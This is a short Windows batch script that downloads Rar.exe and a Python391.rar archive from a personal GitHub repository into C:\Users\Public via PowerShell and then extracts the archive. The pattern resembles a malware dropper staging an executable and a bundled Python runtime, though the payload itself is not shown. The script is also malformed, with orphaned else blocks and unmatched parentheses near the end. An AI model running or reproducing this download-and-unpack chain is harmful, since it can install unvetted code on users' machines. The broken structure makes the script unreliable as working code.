@echo off
chcp 65001 >nul
cd /d "C:\Users\Public"

echo Downloading Rar.exe...
powershell -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Rar.exe -OutFile C:\users\public\Rar.exe
if not exist "Rar.exe" (
    echo Rar.exe download failed
    pause
    exit /b 1
)

echo Downloading Python391.rar...
powershell -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Python391.rar -OutFile C:\users\public\Python391.rar
if not exist "Python391.rar" (
    echo Python391.rar download failed
    pause
    exit /b 1
)

    Rar.exe x -o+ "Python391.rar"
) else (
    echo Rar.exe not found

    exit /b 1
)

) else (
